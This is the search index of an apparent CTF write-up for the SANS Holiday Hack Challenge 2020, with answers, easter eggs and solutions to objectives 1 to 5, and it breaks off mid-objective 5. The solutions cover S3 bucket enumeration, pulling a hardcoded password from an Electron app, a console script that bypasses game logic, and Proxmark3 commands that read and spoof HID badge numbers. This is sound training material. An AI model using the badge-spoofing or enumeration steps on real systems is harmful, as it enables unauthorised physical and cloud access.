{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"Holiday Hack Challenge 2020 KringleCon III: French Hens CTF write-up by Dan Roberts (@infosecetc) Introduction This year's Holiday Hack Challenge picks up from the 2019 cliff-hanger in which Jack Frost vowed to help a villainous Tooth Fairy subvert the holiday. The game opens on the side of the New Jersey Turnpike with a billboard and a sign for Exit 7A in view. A tram car awaits to take visitors up an unseen mountain to Santa's castle. About The Holiday Hack Challenge is a tremendous learning experience. There is a YouTube channel full of conference quality talks. You'll explore the inner-workings of pseudo random number generators, blockchain, and hash collisions. You'll learn a bit of physical penetration testing, using Proxmark3 to impersonate door access key cards. You'll execute a man-in-the-middle attack using Scapy, exploit a vulnerable web application, and learn a bit of Javascript and Python. The list goes on.. If you haven't attended KringleCon 3 yet, register at https://holidayhackchallenge.com/2020 and have some fun exploring before reading through the solutions! Thanks Thank you to Ed Skoudis, CounterHack, SANS, and all of the talented individuals who give their time and effort to make this incredible community event happen each year. Answers Objective Answer 1 Proxmark 2 North Pole: The Frostiest Place on Earth 3 santapass 4 Awarded when you move the Santavator to another floor 5 Awarded when you open the HID lock 6 The Lollipop Guild 7 Awarded when you fix Santa's Sleigh 8 JackFrostWasHere 9 Tanta Kringle 10 Awarded when you override the fingerprint reader 11a 57066318f32f729d 11b fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Introduction"},{"location":"index.html#introduction","text":"This year's Holiday Hack Challenge picks up from the 2019 cliff-hanger in which Jack Frost vowed to help a villainous Tooth Fairy subvert the holiday. The game opens on the side of the New Jersey Turnpike with a billboard and a sign for Exit 7A in view. A tram car awaits to take visitors up an unseen mountain to Santa's castle.","title":"Introduction"},{"location":"index.html#about","text":"The Holiday Hack Challenge is a tremendous learning experience. There is a YouTube channel full of conference quality talks. You'll explore the inner-workings of pseudo random number generators, blockchain, and hash collisions. You'll learn a bit of physical penetration testing, using Proxmark3 to impersonate door access key cards. You'll execute a man-in-the-middle attack using Scapy, exploit a vulnerable web application, and learn a bit of Javascript and Python. The list goes on.. If you haven't attended KringleCon 3 yet, register at https://holidayhackchallenge.com/2020 and have some fun exploring before reading through the solutions!","title":"About"},{"location":"index.html#thanks","text":"Thank you to Ed Skoudis, CounterHack, SANS, and all of the talented individuals who give their time and effort to make this incredible community event happen each year.","title":"Thanks"},{"location":"index.html#answers","text":"Objective Answer 1 Proxmark 2 North Pole: The Frostiest Place on Earth 3 santapass 4 Awarded when you move the Santavator to another floor 5 Awarded when you open the HID lock 6 The Lollipop Guild 7 Awarded when you fix Santa's Sleigh 8 JackFrostWasHere 9 Tanta Kringle 10 Awarded when you override the fingerprint reader 11a 57066318f32f729d 11b fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Answers"},{"location":"eggs.html","text":"Easter Eggs Being John Malkovich The movie Being John Malkovich is based on the concept of a portal to someone else\u2019s mind where you can observe and control their behavior. Floor 1 1/2 is a reference to floor 7 1/2 in the Mertin-Flemmer Building where the portal to John Malkovich\u2019s mind was located. The dark mysterious room with a light at the end somewhat resembles the portal in the movie. In the movie, the characters are ejected from the portal onto the side of the New Jersey Turnpike. Ed Skoudis' Office Tour SANS held a virtual tour and scavenger hunt on Nov-15 where Ed provided a behind the scenes look at where he and his team make magic happen. The billboard contains items that Ed introduced, including: Enigma machine, Klein Bottle, Whitman (the beetle), Coke Zero bottle (\u201cShare a Coke with The Godfather of Pentesting\u201d), and a Tardis (always featured in HHC). The painting in the hallway has eye holes cut out of it, similar to the picture of Albert Einstein in Ed\u2019s office that you can look through from a secret room behind the wall. Garden Party In the back right corner of the courtyard, there is a hidden area on the other side of the shrubbery called \"Garden Party\". Inside is a booth with an animated GIF of the meme \"Dimitri Finds Out\" . The booth provides a series of encoded text strings. If you chat in this area, your text appears encoded in the chat history pane. A simple substitution cipher is used here, and you can determine the substitutions by entering a string of known plaintext. Plaintext : abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890,./? Ciphertext: lR5ET2WuOsx?Ht0h7SKd/nN9pFoMIz fwmgUiZLGkaP8AQ\\BDCecX4ybrj1.3JYv,q Use the Subsitute recipe in Cyberchef to translate what the booth says using the substitutions learned in the chat. Ciphertext: gH nlt M00du vvv gdK duT M00du vvvvM00du Plaintext : Im van Booth ... Its the Booth ....Booth The character behind the booth looks like Evan Booth's avatar, so this is clearly the Evan Booth Booth! Santa Stego The painting of Santa in the hall was created by Ed Skoudis' daughter Jessica, but her initials play well into the story as \"Jack Frost Santa\". A series of small letters are hidden throughout the painting. They form the phrase \"NOW I SHALL BE OUT OF SIGHT\", a line from the poem \"Jack Frost\" by Hannah Flagg Gould. Other references and musings: Jason the plant is on top of a scaffold in the front of the castle. He doesn\u2019t speak, but there is a nail right next to him that offers some career advice . The three French hens greet visitors in French with \u201cBonjour!\u201d \u201cJoyeuses fetes!\u201d \u201cJacques DuGivres\u201d, but they greet Santa in English with \u201cHello!\u201d \u201cMerry Christmas!\u201d \u201cJack Frost!\u201d. Did they know all along that Jack Frost had embodied Santa to carry out his plot? A sign in front of Santa's Castle reads \"Richard F. Hall Custom Homes, LLC\". This is an actual builder in New Jersey who does some really fine work. The vending machine quotes a series of lyrics from Weird Al Yankovich\u2019s song \u201cAlbuquerque\u201d. Professor Query Petabyte's talk referenced a paper that Santa published on blockchain under a pseudonym in 2008. This is based on actual events surrounding the anonymous publication of \"Bitcoin: A Peer-to-Peer Electronic Cash System\", under the pseudonym Satoshi Nakamoto. The Snowball Fight 2 player's name was Hugh Ransom Drysdale, the main antagonist of the 2019 mystery film Knives Out. Tanta Kringle, referenced in objective #9, is a character from Santa Claus is Comin\u2019 to Town. She is the Elf Queen, head of the Kringle family, and the guardian of Kris Kringle when he was a child. The candy cane is an important tool for elves, as observed on the pegboard in Santa's workshop. A picture hanging in the wrapping room contains an email to Chris Elgee giving permission to use the Proxmark3 in HHC20. One of the malicious messages in the CAN-D Bus lock/unlock address was 0000000F2057, which seems to spell out the word FROST. If you lose the Snowball Fight game, your error code is 501_PEBCAK_ERR_4EVA, suggesting that the \"Problem Exists Between Chair and Keyboard\". Pictures hanging all over the castle appear to be very frosty images. Did Jack Frost also impersonate Santa's interior decorator?","title":"Easter Eggs"},{"location":"eggs.html#easter-eggs","text":"","title":"Easter Eggs"},{"location":"eggs.html#being-john-malkovich","text":"The movie Being John Malkovich is based on the concept of a portal to someone else\u2019s mind where you can observe and control their behavior. Floor 1 1/2 is a reference to floor 7 1/2 in the Mertin-Flemmer Building where the portal to John Malkovich\u2019s mind was located. The dark mysterious room with a light at the end somewhat resembles the portal in the movie. In the movie, the characters are ejected from the portal onto the side of the New Jersey Turnpike.","title":"Being John Malkovich"},{"location":"eggs.html#ed-skoudis-office-tour","text":"SANS held a virtual tour and scavenger hunt on Nov-15 where Ed provided a behind the scenes look at where he and his team make magic happen. The billboard contains items that Ed introduced, including: Enigma machine, Klein Bottle, Whitman (the beetle), Coke Zero bottle (\u201cShare a Coke with The Godfather of Pentesting\u201d), and a Tardis (always featured in HHC). The painting in the hallway has eye holes cut out of it, similar to the picture of Albert Einstein in Ed\u2019s office that you can look through from a secret room behind the wall.","title":"Ed Skoudis' Office Tour"},{"location":"eggs.html#garden-party","text":"In the back right corner of the courtyard, there is a hidden area on the other side of the shrubbery called \"Garden Party\". Inside is a booth with an animated GIF of the meme \"Dimitri Finds Out\" . The booth provides a series of encoded text strings. If you chat in this area, your text appears encoded in the chat history pane. A simple substitution cipher is used here, and you can determine the substitutions by entering a string of known plaintext. Plaintext : abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890,./? Ciphertext: lR5ET2WuOsx?Ht0h7SKd/nN9pFoMIz fwmgUiZLGkaP8AQ\\BDCecX4ybrj1.3JYv,q Use the Subsitute recipe in Cyberchef to translate what the booth says using the substitutions learned in the chat. Ciphertext: gH nlt M00du vvv gdK duT M00du vvvvM00du Plaintext : Im van Booth ... Its the Booth ....Booth The character behind the booth looks like Evan Booth's avatar, so this is clearly the Evan Booth Booth!","title":"Garden Party"},{"location":"eggs.html#santa-stego","text":"The painting of Santa in the hall was created by Ed Skoudis' daughter Jessica, but her initials play well into the story as \"Jack Frost Santa\". A series of small letters are hidden throughout the painting. They form the phrase \"NOW I SHALL BE OUT OF SIGHT\", a line from the poem \"Jack Frost\" by Hannah Flagg Gould.","title":"Santa Stego"},{"location":"eggs.html#other-references-and-musings","text":"Jason the plant is on top of a scaffold in the front of the castle. He doesn\u2019t speak, but there is a nail right next to him that offers some career advice . The three French hens greet visitors in French with \u201cBonjour!\u201d \u201cJoyeuses fetes!\u201d \u201cJacques DuGivres\u201d, but they greet Santa in English with \u201cHello!\u201d \u201cMerry Christmas!\u201d \u201cJack Frost!\u201d. Did they know all along that Jack Frost had embodied Santa to carry out his plot? A sign in front of Santa's Castle reads \"Richard F. Hall Custom Homes, LLC\". This is an actual builder in New Jersey who does some really fine work. The vending machine quotes a series of lyrics from Weird Al Yankovich\u2019s song \u201cAlbuquerque\u201d. Professor Query Petabyte's talk referenced a paper that Santa published on blockchain under a pseudonym in 2008. This is based on actual events surrounding the anonymous publication of \"Bitcoin: A Peer-to-Peer Electronic Cash System\", under the pseudonym Satoshi Nakamoto. The Snowball Fight 2 player's name was Hugh Ransom Drysdale, the main antagonist of the 2019 mystery film Knives Out. Tanta Kringle, referenced in objective #9, is a character from Santa Claus is Comin\u2019 to Town. She is the Elf Queen, head of the Kringle family, and the guardian of Kris Kringle when he was a child. The candy cane is an important tool for elves, as observed on the pegboard in Santa's workshop. A picture hanging in the wrapping room contains an email to Chris Elgee giving permission to use the Proxmark3 in HHC20. One of the malicious messages in the CAN-D Bus lock/unlock address was 0000000F2057, which seems to spell out the word FROST. If you lose the Snowball Fight game, your error code is 501_PEBCAK_ERR_4EVA, suggesting that the \"Problem Exists Between Chair and Keyboard\". Pictures hanging all over the castle appear to be very frosty images. Did Jack Frost also impersonate Santa's interior decorator?","title":"Other references and musings:"},{"location":"ending.html","text":"Ending When you've solved the last objective, visit Santa's Balcony as yourself and Santa will give you his congratulations. Narrative The narrative is now fully revealed. KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null!","title":"Ending"},{"location":"ending.html#ending","text":"When you've solved the last objective, visit Santa's Balcony as yourself and Santa will give you his congratulations.","title":"Ending"},{"location":"ending.html#narrative","text":"The narrative is now fully revealed. KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null!","title":"Narrative"},{"location":"Objectives/obj-01.html","text":"Objective #1 - Uncover Santa's Gift List Objective There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Analysis The photo of Santa's gift list has been obscured somehow to keep it a secret. Jingle Ringford provides a link to an online photo editing site photopea.com, and hints that a twirl distortion was used. You'll need to reverse the image distortion to reveal what is on Santa's personal gift list. Solution Step 1: Download the image by clicking on the billboard Step 2: Load the image into Photopea Step 3: Select a rectangle that is centered over the area distorted by the twirl effect Step 4: Apply a twirl effect (Filter > Distort > Twirl, set angle to 300) to reverse the original distortion. The image is not restored completely, however it's enough to read that Santa is planning to bring Josh Wright a Proxmark. Proxmark is a powerful tool that can be used to interact with RFID tags and sensors. Stay tuned.. this will figure into another objective later on. Santa's list before and after the swirl distortion Info Click on your badge and submit the answer for objective 1. You'll receive an achievement and sometimes a passage of the narrative each time you complete an objective. Also, be sure to talk with the elf again after completing a task to see if he or she has any further hints or instructions to offer. Answer: Proxmark","title":"1) Uncover Santa's Gift List"},{"location":"Objectives/obj-01.html#objective-1-uncover-santas-gift-list","text":"","title":"Objective #1 - Uncover Santa's Gift List"},{"location":"Objectives/obj-01.html#objective","text":"There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.","title":"Objective"},{"location":"Objectives/obj-01.html#analysis","text":"The photo of Santa's gift list has been obscured somehow to keep it a secret. Jingle Ringford provides a link to an online photo editing site photopea.com, and hints that a twirl distortion was used. You'll need to reverse the image distortion to reveal what is on Santa's personal gift list.","title":"Analysis"},{"location":"Objectives/obj-01.html#solution","text":"Step 1: Download the image by clicking on the billboard Step 2: Load the image into Photopea Step 3: Select a rectangle that is centered over the area distorted by the twirl effect Step 4: Apply a twirl effect (Filter > Distort > Twirl, set angle to 300) to reverse the original distortion. The image is not restored completely, however it's enough to read that Santa is planning to bring Josh Wright a Proxmark. Proxmark is a powerful tool that can be used to interact with RFID tags and sensors. Stay tuned.. this will figure into another objective later on. Santa's list before and after the swirl distortion Info Click on your badge and submit the answer for objective 1. You'll receive an achievement and sometimes a passage of the narrative each time you complete an objective. Also, be sure to talk with the elf again after completing a task to see if he or she has any further hints or instructions to offer. Answer: Proxmark","title":"Solution"},{"location":"Objectives/obj-02.html","text":"Objective #2 - Investigate S3 Bucket Objective When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Tip For a map of the castle, and the location of each elf, select option 3 in the Kringle Kiosk terminal next to this challenge. Analysis When you click on the terminal, you're asked to help locate a missing package. Find a file in an unknown AWS S3 container, then unwrap multiple layers of encoding and compression to reveal its contents. Solution Step 1: Use the bucket_finder tool to find the location of the AWS S3 bucket that contains the package file. Since the objective states the Wrapper3000 is on the fritz, put wrapper3000 (just a guess!) into the wordlist and run the tool. $ echo \"wrapper3000\" > wordlist $ ./bucket_finder/bucket_finder.rb --download wordlist http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Downloaded> http://s3.amazonaws.com/wrapper3000/package Step 2: With the contents of the S3 bucket downloaded, inspect the file and find that it's base64 encoded. $ file wrapper3000/package wrapper3000/package: ASCII text, with very long lines $ cat wrapper3000/package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA Step 3: Convert the encoded text back into its original form using base64 command. Since you don't know what the original filename was, simply use \"package2\". Next with the file command, determine that package2 is a zip archive and use unzip to extract its contents. $ cat wrapper3000/package | base64 -d > package2 $ file package2 package2: Zip archive data, at least v1.0 to extract $ unzip package2 Archive: package2 extracting: package.txt.Z.xz.xxd.tar.bz2 The unzip command tells you that you now have a file named package.txt.Z.xz.xxd.tar.bz2. You may recognize the extensions as various file compression types used on *nix systems. However, you could use the file command or search Google to determine what they are. .bz2 = bzip2 compressed file (use bunzip2) .tar = Tape Archive file (use tar) .xxd = hexdump encoded file (use xxd) .xz = xz compressed file (use unxz) .Z = compressed file (use uncompress) Step 4: Use the appropriate tool to uncompress or decode each file in turn. $ bunzip2 package.txt.Z.xz.xxd.tar.bz2 $ tar xf package.txt.Z.xz.xxd.tar $ cat package.txt.Z.xz.xxd | xxd -r > package.txt.Z.xz $ unxz package.txt.Z.xz $ uncompress package.txt.Z Step 5: Look at the contents of the package.txt file and get the answer to this objective. $ cat package.txt North Pole: The Frostiest Place on Earth Answer: North Pole: The Frostiest Place on Earth","title":"2) Investigate S3 Bucket"},{"location":"Objectives/obj-02.html#objective-2-investigate-s3-bucket","text":"","title":"Objective #2 - Investigate S3 Bucket"},{"location":"Objectives/obj-02.html#objective","text":"When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Tip For a map of the castle, and the location of each elf, select option 3 in the Kringle Kiosk terminal next to this challenge.","title":"Objective"},{"location":"Objectives/obj-02.html#analysis","text":"When you click on the terminal, you're asked to help locate a missing package. Find a file in an unknown AWS S3 container, then unwrap multiple layers of encoding and compression to reveal its contents.","title":"Analysis"},{"location":"Objectives/obj-02.html#solution","text":"Step 1: Use the bucket_finder tool to find the location of the AWS S3 bucket that contains the package file. Since the objective states the Wrapper3000 is on the fritz, put wrapper3000 (just a guess!) into the wordlist and run the tool. $ echo \"wrapper3000\" > wordlist $ ./bucket_finder/bucket_finder.rb --download wordlist http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Downloaded> http://s3.amazonaws.com/wrapper3000/package Step 2: With the contents of the S3 bucket downloaded, inspect the file and find that it's base64 encoded. $ file wrapper3000/package wrapper3000/package: ASCII text, with very long lines $ cat wrapper3000/package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA Step 3: Convert the encoded text back into its original form using base64 command. Since you don't know what the original filename was, simply use \"package2\". Next with the file command, determine that package2 is a zip archive and use unzip to extract its contents. $ cat wrapper3000/package | base64 -d > package2 $ file package2 package2: Zip archive data, at least v1.0 to extract $ unzip package2 Archive: package2 extracting: package.txt.Z.xz.xxd.tar.bz2 The unzip command tells you that you now have a file named package.txt.Z.xz.xxd.tar.bz2. You may recognize the extensions as various file compression types used on *nix systems. However, you could use the file command or search Google to determine what they are. .bz2 = bzip2 compressed file (use bunzip2) .tar = Tape Archive file (use tar) .xxd = hexdump encoded file (use xxd) .xz = xz compressed file (use unxz) .Z = compressed file (use uncompress) Step 4: Use the appropriate tool to uncompress or decode each file in turn. $ bunzip2 package.txt.Z.xz.xxd.tar.bz2 $ tar xf package.txt.Z.xz.xxd.tar $ cat package.txt.Z.xz.xxd | xxd -r > package.txt.Z.xz $ unxz package.txt.Z.xz $ uncompress package.txt.Z Step 5: Look at the contents of the package.txt file and get the answer to this objective. $ cat package.txt North Pole: The Frostiest Place on Earth Answer: North Pole: The Frostiest Place on Earth","title":"Solution"},{"location":"Objectives/obj-03.html","text":"Objective #3 - Point-of-Sale Password Recovery Objective Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Analysis When you click on the terminal, you'll discover that it is locked out. Click on the provided link to download santa-shop.exe and perform off-line analysis to recover the password. Screenshot of locked out point-of-sale terminal Tip Be sure to pick up the broken candy cane on your way into Santa's Castle. Explore the castle and pick up any other objects you see, as these will come in handy later. Tip Download a Windows virtual machine from Microsoft to use during this objective so you don\u2019t have to install anything directly onto your computer. Solution Step 1: Install santa-shop.exe. You'll find its program files are unpacked in %USERPROFILE%\\AppData\\Local\\Programs\\santa-shop\\ Step 2: The LICENSE.electron.txt file hints that this program was written using Electron, an open-source framework for developing desktop applications using web technologies. Step 3: Download and install NodeJS, and then install the asar module. > npm install -g asar Step 4: Unpack the app.asar file to reveal the application\u2019s source code. > cd %USERPROFILE%\\AppData\\Local\\Programs\\santa-shop\\resoures > md source > asar extract app.asar source Step 5: Open main.js and find the password. If you weren\u2019t quite sure where to find it, the README.md file provides a hint on which file to look in. Password shown in main.js Answer: santapass","title":"3) Point-of-Sale Password Recovery"},{"location":"Objectives/obj-03.html#objective-3-point-of-sale-password-recovery","text":"","title":"Objective #3 - Point-of-Sale Password Recovery"},{"location":"Objectives/obj-03.html#objective","text":"Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?","title":"Objective"},{"location":"Objectives/obj-03.html#analysis","text":"When you click on the terminal, you'll discover that it is locked out. Click on the provided link to download santa-shop.exe and perform off-line analysis to recover the password. Screenshot of locked out point-of-sale terminal Tip Be sure to pick up the broken candy cane on your way into Santa's Castle. Explore the castle and pick up any other objects you see, as these will come in handy later. Tip Download a Windows virtual machine from Microsoft to use during this objective so you don\u2019t have to install anything directly onto your computer.","title":"Analysis"},{"location":"Objectives/obj-03.html#solution","text":"Step 1: Install santa-shop.exe. You'll find its program files are unpacked in %USERPROFILE%\\AppData\\Local\\Programs\\santa-shop\\ Step 2: The LICENSE.electron.txt file hints that this program was written using Electron, an open-source framework for developing desktop applications using web technologies. Step 3: Download and install NodeJS, and then install the asar module. > npm install -g asar Step 4: Unpack the app.asar file to reveal the application\u2019s source code. > cd %USERPROFILE%\\AppData\\Local\\Programs\\santa-shop\\resoures > md source > asar extract app.asar source Step 5: Open main.js and find the password. If you weren\u2019t quite sure where to find it, the README.md file provides a hint on which file to look in. Password shown in main.js Answer: santapass","title":"Solution"},{"location":"Objectives/obj-04.html","text":"Objective #4 - Operate the Santavator Objective Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Analysis When first entering Santa's elevator, there is a missing button for the Workshop, and none of the other buttons are functional. The elevator service key provided by Sparkle Redberry opens the panel, exposing the next challenge. Any objects that you collected while exploring the first floor of the castle appear inside the panel, and can be moved around to change the path and color of the sparkle stream. The goal is to direct a stream of matching colored sparkles into each socket. Activating all of the buttons is an iterative process of exploring the castle, finding more objects, and arranging them inside the panel to activate more buttons. When enough sparkles of each color are flowing into all the sockets, and you've found the missing button, all the floors can be accessed except for Santa's office which requires a valid thumb print. Solution One possible solution to the S4 stream Bypass the S4 Stream If you'd rather not figure out how to arrange all the bits and pieces in the elevator panel, you could use the browser developer tools to examine the Santavator javascript and figure out how to bypass the entire process. Step 1: Open the console (in Chrome, press F12 and click on the Console tab). Step 2: Select \"elevator.kringlecastle.com\" from the context drop-down list. Context menu in browser console Step 3: Copy and paste the following script at the console prompt. // Add the button for Santa's workshop on floor 1 and one-half. btn15img.classList.add('found'); // Stop the sparkle stream. stop=true // Power the buttons btn1.classList.add('powered') btn2.classList.add('powered') btn3.classList.add('powered') btn4.classList.add('powered') btnr.classList.add('powered') // Toggle the panel open and closed (not necessary) document.body.classList.toggle('open'); It's important to stop the Sparkle Stream before applying power to each button. If not, the looping javascript that checks whether enough sparkles are being fed to each socket will immediately remove power from the buttons that you turn on. Step 4: Press a button and travel to your desired floor.","title":"4) Operate the Santavator"},{"location":"Objectives/obj-04.html#objective-4-operate-the-santavator","text":"","title":"Objective #4 - Operate the Santavator"},{"location":"Objectives/obj-04.html#objective","text":"Talk to Pepper Minstix in the entryway to get some hints about the Santavator.","title":"Objective"},{"location":"Objectives/obj-04.html#analysis","text":"When first entering Santa's elevator, there is a missing button for the Workshop, and none of the other buttons are functional. The elevator service key provided by Sparkle Redberry opens the panel, exposing the next challenge. Any objects that you collected while exploring the first floor of the castle appear inside the panel, and can be moved around to change the path and color of the sparkle stream. The goal is to direct a stream of matching colored sparkles into each socket. Activating all of the buttons is an iterative process of exploring the castle, finding more objects, and arranging them inside the panel to activate more buttons. When enough sparkles of each color are flowing into all the sockets, and you've found the missing button, all the floors can be accessed except for Santa's office which requires a valid thumb print.","title":"Analysis"},{"location":"Objectives/obj-04.html#solution","text":"One possible solution to the S4 stream","title":"Solution"},{"location":"Objectives/obj-04.html#bypass-the-s4-stream","text":"If you'd rather not figure out how to arrange all the bits and pieces in the elevator panel, you could use the browser developer tools to examine the Santavator javascript and figure out how to bypass the entire process. Step 1: Open the console (in Chrome, press F12 and click on the Console tab). Step 2: Select \"elevator.kringlecastle.com\" from the context drop-down list. Context menu in browser console Step 3: Copy and paste the following script at the console prompt. // Add the button for Santa's workshop on floor 1 and one-half. btn15img.classList.add('found'); // Stop the sparkle stream. stop=true // Power the buttons btn1.classList.add('powered') btn2.classList.add('powered') btn3.classList.add('powered') btn4.classList.add('powered') btnr.classList.add('powered') // Toggle the panel open and closed (not necessary) document.body.classList.toggle('open'); It's important to stop the Sparkle Stream before applying power to each button. If not, the looping javascript that checks whether enough sparkles are being fed to each socket will immediately remove power from the buttons that you turn on. Step 4: Press a button and travel to your desired floor.","title":"Bypass the S4 Stream"},{"location":"Objectives/obj-05.html","text":"Objective #5 - Open HID Lock Objective Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Analysis You'll need to learn to use the Proxmark3 and access the locked door in Santa's workshop. Tip Watch Larry Pesce's HID Card Hacking talk for an introduction to the Proxmark3. Tip Before you can complete this step, you'll need to pick up the Proxmark3 device that\u2019s on the floor of the Wrapping Room. Once you have it, you can access it from the Items section of your badge. Solution Step 1: Stand near Angel Candysalt and activate the scanner to get your first valid card read. [magicdust] pm3 \u2192 lf hid read #db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040 Step 2: Repeat the process near Holly Evergreen and Sparkle Redberry. [magicdust] pm3 \u2192 lf hid read #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024 [magicdust] pm3 \u2192 lf hid read #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022 Step 3: Stand near the HID card reader by the locked door in Santa\u2019s workshop and transmit some generated tag ID\u2019s. Simply replaying the cards that were scanned will not open the door, so you\u2019ll need to try some other nearby card numbers with the same facility code. Card #6025 opens the door. [magicdust] lf hid sim -r 2006E22F13 Tip You can use this handy calculator to generate a raw tag ID to enter into Proxmark3: http://www.ccdesignworks.com/wiegand_calc.htm Being Santa Claus On the other side of the door is a dark room with what appears to be eyeholes on the far end. After peeping through eye holes, you find yourself on the other side of the wall but as Santa Claus! Are you Santa Claus? Are you just controlling him like a puppet? Either way, you'll find that exploring the castle as Santa opens doors to some previously unreachable experiences.","title":"5) Open HID Lock"},{"location":"Objectives/obj-05.html#objective-5-open-hid-lock","text":"","title":"Objective #5 - Open HID Lock"},{"location":"Objectives/obj-05.html#objective","text":"Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.","title":"Objective"},{"location":"Objectives/obj-05.html#analysis","text":"You'll need to learn to use the Proxmark3 and access the locked door in Santa's workshop. Tip Watch Larry Pesce's HID Card Hacking talk for an introduction to the Proxmark3. Tip Before you can complete this step, you'll need to pick up the Proxmark3 device that\u2019s on the floor of the Wrapping Room. Once you have it, you can access it from the Items section of your badge.","title":"Analysis"},{"location":"Objectives/obj-05.html#solution","text":"Step 1: Stand near Angel Candysalt and activate the scanner to get your first valid card read. [magicdust] pm3 \u2192 lf hid read 